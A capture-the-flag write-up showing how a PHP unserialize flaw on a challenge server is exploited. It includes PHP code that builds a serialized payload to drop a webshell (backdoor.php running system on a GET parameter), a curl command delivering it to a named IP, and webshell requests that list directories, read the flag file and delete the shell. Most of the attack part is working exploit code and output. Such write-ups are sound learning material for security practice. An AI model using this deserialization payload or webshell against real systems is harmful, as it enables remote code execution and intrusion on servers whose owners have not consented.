# Web Exotic Attacks Handy Tool

First of all Manny ... and it was guess my name so a fast browsing it came to Manny Iscusitul, submitting it revealed: **backup.zip**

We test:

```graphql
?tool=unserialize&input=O:4:"Test":0:{}
```

And get:

```makefile
object(__PHP_Incomplete_Class)#1 (1) { ["__PHP_Incomplete_Class_Name"]=> string(4) "Test" }
```

- This confirms PHP unserialize is active, and no filtering is in place.

### Write a Backdoor

Create a custom class locally:

```php
<?php
class PHPClass {
    public $condition = true;
    public $prop;

    public function __construct() {
        $this->prop = "system('echo <?php system(\$_GET[\"cmd\"]); ?> > backdoor.php');";
    }
}

echo urlencode(serialize(new PHPClass()));
?>
```
Save this as `payload.php` and run: **php payload.php > payload.txt**

Send the payload to the server: `curl "http://141.85.224.99:8004/?tool=unserialize&input=$(cat payload.txt)"`

This writes a webshell to: **http://141.85.224.99:8004/backdoor.php**

We confirm code execution:

```bash
http://141.85.224.99:8004/backdoor.php?cmd=ls /
→ Output:

bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
````

Then:

```bash
http://141.85.224.99:8004/backdoor.php?cmd=ls /home
→ ctf

http://141.85.224.99:8004/backdoor.php?cmd=ls /home/ctf
→ flag.txt

http://141.85.224.99:8004/backdoor.php?cmd=cat /home/ctf/flag.txt
→ SSS{y0u_g0t_a_r3v3rs3_sh3ll_didnt_y0u_l1ttl3_pr1ck}
```

Remove your shell: `http://141.85.224.99:8004/backdoor.php?cmd=rm backdoor.php`
